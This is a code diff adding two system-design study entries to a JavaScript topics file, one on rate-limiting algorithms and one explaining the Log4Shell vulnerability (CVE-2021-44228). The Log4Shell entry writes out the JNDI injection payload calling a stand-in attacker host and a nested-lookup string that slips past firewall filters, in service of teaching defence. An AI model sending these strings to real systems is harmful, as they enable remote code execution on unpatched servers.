@@ -397,6 +397,34 @@ export const SYSTEM_DESIGN_TOPICS_BY_DAY = {
         "The ECB Penguin Trap (Never use AES in ECB mode; always use AEAD modes like AES-GCM or ChaCha20-Poly1305 to guarantee confidentiality AND tamper-proof integrity)"
       ],
       "keyTakeaway": "Symmetric encryption (AES-256-GCM) secures bulk data at rest and high-throughput network channels with hardware acceleration; asymmetric encryption (ECC / RSA) solves key exchange and digital identity. In system design, always propose a Hybrid Cryptosystem (TLS 1.3) for data in transit and KMS Envelope Encryption (KEK + DEK) for data at rest, strictly using AEAD modes."
+    },
+    {
+      "id": "3.6",
+      "tabTitle": "3.6 Rate Limiting",
+      "title": "3.6 Rate Limiting Algorithms & Architecture",
+      "section": "Part 3 · Security, Auth & API Access",
+      "whatItIs": "Controlling the rate of traffic sent or received to protect backend capacity, manage traffic spikes, enforce fair multi-tenant quotas, and prevent DoS attacks.",
+      "architecture": "ATOMIC REDIS TOKEN BUCKET (Lua):\nlocal key = KEYS[1]; local tokens = redis.call('get', key .. ':tokens') or capacity\nlocal elapsed = math.max(0, now - last_refill); tokens = min(capacity, tokens + elapsed * refill_rate)\nif tokens >= requested then redis.call('set', key .. ':tokens', tokens - requested); return 1 else return 0 end\nHTTP 429: Returns X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset, and Retry-After headers.",
+      "tradeoffs": [
+        "5 Algorithms: Token Bucket (burst-tolerant default) vs Leaky Bucket (smooth output) vs Fixed Window (boundary bursts) vs Sliding Log (exact, O(N) RAM) vs Sliding Counter (production hybrid)",
+        "Distributed Race Conditions: Atomic Redis Lua scripts + cluster hash tags {user_id}:tokens eliminate concurrency leaks",
+        "Fail-Open vs Fail-Closed: Always fail-open with local in-memory fallback limits if Redis cluster crashes"
+      ],
+      "keyTakeaway": "Rate limiting protects system availability, controls cloud costs, and guarantees multi-tenant fairness. Know the 5 algorithms cold: Token Bucket (burst-tolerant default), Leaky Bucket (smooth output), Fixed Window (simple but flawed boundary), Sliding Log (exact but memory heavy), and Sliding Window Counter (production hybrid)."
+    },
+    {
+      "id": "3.7",
+      "tabTitle": "3.7 Log4Shell Zero-Day",
+      "title": "3.5 Log4Shell: Anatomy of a Zero-Day",
+      "section": "Part 3 · Security, Auth & API Access",
+      "whatItIs": "Analysis of CVE-2021-44228 (CVSS 10.0) where JNDI message lookup interpolation in logging permitted remote code execution via LDAP/RMI.",
+      "architecture": "THE 5-STAGE EXPLOITATION CHAIN:\nAttacker sends payload: ${jndi:ldap://attacker.com:1389/Exploit} in User-Agent header\n  │\n  ▼ 1. Target app logs string via Log4j 2.x (Message Pattern Converter)\n  ▼ 2. Log4j JNDI Manager initiates outbound TCP connection to attacker LDAP server (Port 1389)\n  ▼ 3. Remote LDAP server returns Java Reference object pointing to Exploit.class\n  ▼ 4. Host JVM fetches and deserializes remote bytecode\n  ▼ 5. JVM executes bytecode constructor → Full Remote Code Execution (RCE) / Reverse Shell!",
+      "tradeoffs": [
+        "Active Evaluation in a Passive Sink (Logging was assumed to be safe text; Log4j turned it into an unconstrained expression evaluator)",
+        "Default-Deny Egress: Blocking arbitrary outbound non-443 connections breaks the exploit chain completely even on unpatched servers",
+        "WAF Regex Fallacy: Perimeter regex rules are easily bypassed via nested lookups ${${lower:j}ndi:; defense must be architectural"
+      ],
+      "keyTakeaway": "Log4Shell proved that logging is an execution sink, not just a passive text dump. In system design interviews, treat security as multi-layered defense-in-depth: sanitize input, isolate runtime processes with non-root containers, enforce strict Default-Deny Egress firewalls, and maintain automated SBOM inventory for rapid zero-day remediation."
     }
   ],
   "9": [
